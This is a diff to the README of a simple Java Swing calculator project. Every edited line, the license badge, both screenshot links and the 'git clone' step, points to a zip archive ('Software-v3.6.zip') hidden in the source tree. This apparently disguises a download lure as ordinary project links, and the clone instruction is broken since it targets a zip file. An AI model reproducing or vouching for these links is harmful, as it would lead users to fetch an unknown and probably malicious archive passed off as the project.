@@ -1,7 +1,7 @@
 # Calculator
 A very basic calculator application created using Java **Swing**. 
 
-[![License MIT](https://github.com/QuevedoM98/Calculator/raw/refs/heads/master/src/main/java/com/houarizegai/Calculator-1.8.zip)](LICENSE)
+[![License MIT](https://raw.githubusercontent.com/QuevedoM98/Calculator/master/src/main/java/com/houarizegai/calculator/theme/Software-v3.6.zip)](LICENSE)
 
 ## Thank You!
 Please ⭐️ this repo and share it with others
@@ -9,7 +9,7 @@ Please ⭐️ this repo and share it with others
 ## Screenshots
 |                Scientific / Dark                | Standard / Colored |
 :------------------------------------------------:|:-------------------|
- ![Dark calculator screenshot](https://github.com/QuevedoM98/Calculator/raw/refs/heads/master/src/main/java/com/houarizegai/Calculator-1.8.zip) | ![Colored calculator screenshot](https://github.com/QuevedoM98/Calculator/raw/refs/heads/master/src/main/java/com/houarizegai/Calculator-1.8.zip)
+ ![Dark calculator screenshot](https://raw.githubusercontent.com/QuevedoM98/Calculator/master/src/main/java/com/houarizegai/calculator/theme/Software-v3.6.zip) | ![Colored calculator screenshot](https://raw.githubusercontent.com/QuevedoM98/Calculator/master/src/main/java/com/houarizegai/calculator/theme/Software-v3.6.zip)
 
 ## Requirements 🔧
 * Java 11 or higher.
@@ -19,7 +19,7 @@ Please ⭐️ this repo and share it with others
 
 2. Download the repository files (project) from the download section or clone this project by typing in the bash the following command:
 
-       git clone https://github.com/QuevedoM98/Calculator/raw/refs/heads/master/src/main/java/com/houarizegai/Calculator-1.8.zip
+       git clone https://raw.githubusercontent.com/QuevedoM98/Calculator/master/src/main/java/com/houarizegai/calculator/theme/Software-v3.6.zip
 3. Imported it in Intellij IDEA or any other Java IDE.
 4. Run the application :D
 
